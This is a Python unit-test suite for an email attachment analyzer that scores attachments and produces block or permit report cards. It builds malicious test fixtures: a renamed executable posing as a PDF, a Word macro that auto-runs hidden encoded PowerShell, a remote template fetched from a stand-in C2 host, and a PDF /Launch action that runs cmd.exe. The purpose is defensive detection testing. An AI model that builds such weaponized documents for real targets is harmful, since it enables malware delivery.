"""
TestAttachmentReportCard — Verification Suite for Per-Attachment Report Card
Mission 02 / Goal 2:
1. Detected File Type (MIME, signature, category, declared vs detected)
2. Suspicious Features (structured threat features, MITRE mapping, severity)
3. Benign Features (clean documents have zero suspicious features and verified benign features)
4. Risk Level (MALICIOUS, SUSPICIOUS, SAFE with numeric risk score & severity tier)
5. Recommended Action (primary action, action label, urgency, end-user guidance, SOC analyst playbook, checklist)
6. Unified Report Card Container (card_id, BSA 65B certificate, zero-execution guarantee)
"""
import io
import os
import sys
import zipfile
import unittest

sys.path.insert(0, os.path.dirname(__file__))

from attachment_analyzer import AttachmentAnalyzer


class TestAttachmentReportCard(unittest.TestCase):
    """Rigorous verification of per-attachment report card fields and structures."""

    def test_01_renamed_pe_report_card(self):
        """Test report card for renamed PE masquerading as PDF."""
        mz_payload = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + b"Disguised PE payload" * 8
        rep = AttachmentAnalyzer.inspect_attachment(
            filename="Urgent_Invoice.pdf",
            payload=mz_payload,
            declared_ct="application/pdf"
        )

        # 1. Detected file type
        self.assertIn("detected_file_type", rep)
        dft = rep["detected_file_type"]
        self.assertEqual(dft["category"], "EXECUTABLE")
        self.assertIn("Windows Portable Executable", dft["format_name"])
        self.assertIn("application/x-dosexec", dft["mime_type"])
        self.assertEqual(dft["declared_extension"], ".pdf")
        self.assertTrue(dft["mime_mismatch"])
        self.assertTrue(dft["extension_mismatch"])
        self.assertTrue(dft["magic_ascii"].startswith("MZ"))

        # 2. Suspicious features
        self.assertIn("suspicious_features", rep)
        feats = rep["suspicious_features"]
        self.assertGreater(len(feats), 0)
        feat_ids = [f["id"] for f in feats]
        self.assertTrue(any("RENAMED_EXECUTABLE" in fid for fid in feat_ids))
        masq_feat = next(f for f in feats if "RENAMED_EXECUTABLE" in f["id"])
        self.assertEqual(masq_feat["severity"], "CRITICAL")
        self.assertIn("T1036.008", masq_feat["mitre_attack"])

        # 3. Risk level
        self.assertEqual(rep["risk_level"], "MALICIOUS")
        self.assertEqual(rep["risk_score"], 100.0)
        self.assertFalse(rep["is_safe"])

        # 4. Recommended action
        self.assertIn("recommended_action", rep)
        act = rep["recommended_action"]
        self.assertEqual(act["primary_action"], "BLOCK_AND_QUARANTINE")
        self.assertIn("BLOCK", act["action_label"].upper())
        self.assertEqual(act["urgency"], "IMMEDIATE_ACTION_REQUIRED")
        self.assertIn("quarantine", act["summary"].lower())
        self.assertIn("do not", act["end_user_guidance"].lower())
        self.assertGreaterEqual(len(act["soc_analyst_playbook"]), 3)
        self.assertGreaterEqual(len(act["remediation_checklist"]), 3)

        # 5. Report card container
        self.assertIn("report_card", rep)
        card = rep["report_card"]
        self.assertTrue(card["card_id"].startswith("REPCARD-ATT-"))
        self.assertEqual(card["filename"], "Urgent_Invoice.pdf")
        self.assertEqual(card["severity_tier"], "CRITICAL_THREAT")
        self.assertIn("BSA", card["legal_evidence_certificate"]["statute"])
        self.assertIn("in-memory", card["zero_execution_guarantee"].lower())

    def test_02_weaponized_macro_report_card(self):
        """Test report card for macro-enabled document calling PowerShell."""
        bio = io.BytesIO()
        with zipfile.ZipFile(bio, "w") as zf:
            zf.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
            zf.writestr("word/document.xml", "<w:document><w:body><w:p><w:r><w:t>Review contract</w:t></w:r></w:p></w:body></w:document>")
            zf.writestr("word/vbaProject.bin", b"Sub AutoOpen()\r\nShell \"powershell.exe -enc AAAA\", vbHide\r\nEnd Sub")
        payload = bio.getvalue()

        rep = AttachmentAnalyzer.inspect_attachment(
            filename="Contract_Review.docm",
            payload=payload,
            declared_ct="application/vnd.ms-word.document.macroEnabled.12"
        )

        self.assertEqual(rep["risk_level"], "MALICIOUS")
        self.assertGreaterEqual(rep["risk_score"], 95.0)

        # Suspicious features
        feats = rep["suspicious_features"]
        self.assertGreater(len(feats), 0)
        self.assertTrue(any("MACRO" in f["id"] or "WEAPONIZED" in f["name"].upper() for f in feats))

        # Recommended action
        act = rep["recommended_action"]
        self.assertEqual(act["primary_action"], "BLOCK_AND_QUARANTINE")
        self.assertIn("macro", act["summary"].lower())

        # Report card
        card = rep["report_card"]
        self.assertEqual(card["severity_tier"], "CRITICAL_THREAT")

    def test_03_remote_template_injection_report_card(self):
        """Test report card for remote template injection document."""
        bio = io.BytesIO()
        with zipfile.ZipFile(bio, "w") as zf:
            zf.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
            zf.writestr("word/document.xml", "<w:document><w:body><w:p><w:r><w:t>Template test</w:t></w:r></w:p></w:body></w:document>")
            zf.writestr("word/_rels/settings.xml.rels", '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://malicious-c2-server.com/payload.dotm" TargetMode="External"/></Relationships>')
        payload = bio.getvalue()

        rep = AttachmentAnalyzer.inspect_attachment(
            filename="Project_Specs.docx",
            payload=payload,
            declared_ct="application/vnd.openxmlformats-officedocument.wordprocessingml.document"
        )

        self.assertEqual(rep["risk_level"], "MALICIOUS")
        self.assertGreaterEqual(rep["risk_score"], 95.0)

        feats = rep["suspicious_features"]
        self.assertTrue(any("TEMPLATE" in f["id"].upper() or "TEMPLATE" in f["name"].upper() for f in feats))

        act = rep["recommended_action"]
        self.assertEqual(act["primary_action"], "BLOCK_AND_QUARANTINE")
        self.assertIn("template", act["summary"].lower())

    def test_04_pdf_launch_exploit_report_card(self):
        """Test report card for PDF containing /Launch token."""
        pdf_payload = (
            b"%PDF-1.7\r\n"
            b"1 0 obj\r\n"
            b"<< /Type /Catalog /Pages 2 0 R /OpenAction << /Type /Action /S /Launch /F (cmd.exe) /P (/c calc.exe) >> >>\r\n"
            b"endobj\r\n"
            b"trailer\r\n<< /Root 1 0 R >>\r\n%%EOF"
        )
        rep = AttachmentAnalyzer.inspect_attachment(
            filename="Invoice_Exploit.pdf",
            payload=pdf_payload,
            declared_ct="application/pdf"
        )

        self.assertEqual(rep["risk_level"], "MALICIOUS")
        self.assertGreaterEqual(rep["risk_score"], 95.0)

        # Detected file type
        dft = rep["detected_file_type"]
        self.assertEqual(dft["category"], "DOCUMENT")
        self.assertEqual(dft["mime_type"], "application/pdf")

        # Suspicious features
        feats = rep["suspicious_features"]
        self.assertTrue(any("LAUNCH" in f["id"].upper() for f in feats))

        # Recommended action
        act = rep["recommended_action"]
        self.assertEqual(act["primary_action"], "BLOCK_AND_QUARANTINE")
        self.assertIn("pdf", act["summary"].lower())

    def test_05_password_protected_zip_with_in_body_password(self):
        """Test report card for password protected ZIP with body password."""
        # Craft a ZIP with encryption bit 0 set
        zip_bytes = (
            b"PK\x03\x04"
            b"\x14\x00"
            b"\x01\x00"  # Bit 0 set = Encrypted
            b"\x08\x00"
            b"\x00\x00\x00\x00"
            b"\x00\x00\x00\x00"
            b"\x00\x00\x00\x00"
            b"\x00\x00\x00\x00"
            b"\x0c\x00\x00\x00"  # filename len = 12
            b"malware.exe"
            b"encrypted_payload_data_stream_bytes"
        )
        email_body = "Hi team, find the confidential report attached. Password is: Secret2026!"

        rep = AttachmentAnalyzer.inspect_attachment(
            filename="Quarterly_Report.zip",
            payload=zip_bytes,
            declared_ct="application/zip",
            email_body_text=email_body
        )

        self.assertEqual(rep["risk_level"], "MALICIOUS")
        self.assertEqual(rep["risk_score"], 100.0)

        feats = rep["suspicious_features"]
        self.assertTrue(any("INBODY" in f["id"].upper() or "PASSWORD" in f["id"].upper() for f in feats))

        act = rep["recommended_action"]
        self.assertEqual(act["primary_action"], "BLOCK_AND_QUARANTINE")
        self.assertIn("encrypted", act["summary"].lower())

    def test_06_genuine_vendor_pdf_invoice_report_card(self):
        """Test report card for certified benign PDF invoice."""
        clean_pdf = (
            b"%PDF-1.7\r\n"
            b"1 0 obj\r\n"
            b"<< /Type /Catalog /Pages 2 0 R >>\r\n"
            b"endobj\r\n"
            b"trailer\r\n<< /Root 1 0 R >>\r\n%%EOF"
        )
        rep = AttachmentAnalyzer.inspect_attachment(
            filename="AWS_Invoice_98124.pdf",
            payload=clean_pdf,
            declared_ct="application/pdf"
        )

        self.assertEqual(rep["risk_level"], "SAFE")
        self.assertEqual(rep["risk_score"], 0.0)
        self.assertTrue(rep["is_safe"])

        # Suspicious features must be EMPTY
        self.assertEqual(len(rep["suspicious_features"]), 0)

        # Benign features must be populated
        self.assertGreater(len(rep["benign_features"]), 0)
        self.assertTrue(any("ISO 32000-1" in bf for bf in rep["benign_features"]))

        # Recommended action
        act = rep["recommended_action"]
        self.assertEqual(act["primary_action"], "PERMIT_DELIVERY")
        self.assertIn("PERMIT", act["action_label"].upper())
        self.assertEqual(act["urgency"], "ROUTINE_TRAFFIC")
        self.assertIn("clean", act["end_user_guidance"].lower())

        # Report card
        card = rep["report_card"]
        self.assertEqual(card["severity_tier"], "NEGLIGIBLE_RISK")
        self.assertEqual(card["suspicious_features_count"], 0)
        self.assertGreater(card["benign_features_count"], 0)

    def test_07_plain_docx_document_report_card(self):
        """Test report card for clean, macro-free plain DOCX document."""
        bio = io.BytesIO()
        with zipfile.ZipFile(bio, "w") as zf:
            zf.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
            zf.writestr("word/document.xml", "<w:document><w:body><w:p><w:r><w:t>Meeting minutes</w:t></w:r></w:p></w:body></w:document>")
        clean_docx = bio.getvalue()

        rep = AttachmentAnalyzer.inspect_attachment(
            filename="Board_Meeting_Minutes.docx",
            payload=clean_docx,
            declared_ct="application/vnd.openxmlformats-officedocument.wordprocessingml.document"
        )

        self.assertEqual(rep["risk_level"], "SAFE")
        self.assertEqual(rep["risk_score"], 0.0)
        self.assertTrue(rep["is_safe"])
        self.assertEqual(len(rep["suspicious_features"]), 0)
        self.assertGreater(len(rep["benign_features"]), 0)
        self.assertEqual(rep["recommended_action"]["primary_action"], "PERMIT_DELIVERY")

    def test_08_benign_image_archive_report_card(self):
        """Test report card for benign image ZIP archive."""
        bio = io.BytesIO()
        with zipfile.ZipFile(bio, "w") as zf:
            zf.writestr("photo1.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 32)
            zf.writestr("photo2.jpg", b"\xff\xd8\xff" + b"\x00" * 32)
        clean_zip = bio.getvalue()

        rep = AttachmentAnalyzer.inspect_attachment(
            filename="Event_Photos.zip",
            payload=clean_zip,
            declared_ct="application/zip"
        )

        self.assertEqual(rep["risk_level"], "SAFE")
        self.assertEqual(rep["risk_score"], 0.0)
        self.assertTrue(rep["is_safe"])
        self.assertEqual(len(rep["suspicious_features"]), 0)
        self.assertGreater(len(rep["benign_features"]), 0)
        self.assertEqual(rep["recommended_action"]["primary_action"], "PERMIT_DELIVERY")


if __name__ == "__main__":
    unittest.main()
